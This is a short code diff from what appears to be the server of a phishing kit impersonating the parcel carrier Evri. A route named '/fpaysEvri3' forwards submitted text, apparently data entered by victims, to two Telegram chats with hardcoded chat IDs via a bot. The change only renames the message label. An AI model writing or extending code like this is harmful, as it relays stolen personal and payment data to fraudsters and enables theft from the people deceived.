@@ -1838,7 +1838,7 @@ app.post('/fpaysEvri3', (req, res) => {
             fpaysC = 0;
         } else {
             axios.post(
-                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriFpays:\n${originalText}`
+                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriMannyGC:\n${originalText}`
             );
             axios.post(
                 `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-1001708890887&text=Evri:\n${originalText}`
